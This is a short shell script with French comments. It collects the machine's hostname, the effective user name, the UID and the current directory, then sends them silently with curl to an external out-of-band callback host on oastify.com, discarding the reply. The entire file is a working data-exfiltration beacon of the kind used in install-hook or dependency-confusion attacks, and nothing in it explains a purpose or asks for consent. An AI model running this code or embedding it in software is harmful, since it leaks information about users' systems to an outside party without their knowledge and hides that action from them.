#!/bin/sh

# --- Vérifier la présence de curl ---
if ! command -v curl >/dev/null 2>&1; then
    printf '%s\n' "Erreur : curl est introuvable." >&2
    exit 127
fi

# --- Nom de machine ---
HOST=$(uname -n 2>/dev/null)
[ -n "$HOST" ] || HOST=${COMPUTERNAME:-}
[ -n "$HOST" ] || HOST=$(cat /proc/sys/kernel/hostname 2>/dev/null)
[ -n "$HOST" ] || HOST="unknown"

# --- Nom de l'utilisateur effectif ---
# Privilégier l'identité du processus aux variables d'environnement.
USER_NAME=$(id -un 2>/dev/null)
[ -n "$USER_NAME" ] || USER_NAME=$(whoami 2>/dev/null)
[ -n "$USER_NAME" ] || USER_NAME=${USER:-${LOGNAME:-${USERNAME:-}}}
[ -n "$USER_NAME" ] || USER_NAME="unknown"

# --- UID effectif ---
UID_VAL=$(id -u 2>/dev/null)
[ -n "$UID_VAL" ] || UID_VAL="unknown"

# --- Répertoire courant ---
CWD=$(pwd 2>/dev/null)
[ -n "$CWD" ] || CWD="unknown"

# --- Envoi HTTP ---
# Ignorer le corps de la réponse, mais conserver les erreurs sur stderr.
curl --silent --show-error --fail \
    --connect-timeout 5 \
    --max-time 10 \
    --get \
    --data-urlencode "host=$HOST" \
    --data-urlencode "uid=$UID_VAL" \
    --data-urlencode "pwd=$CWD" \
    --data-urlencode "user=$USER_NAME" \
    --output /dev/null \
    "http://yfhoz96xhi1ekrwm8tgp9hc0zr5it8hx.oastify.com/collect"
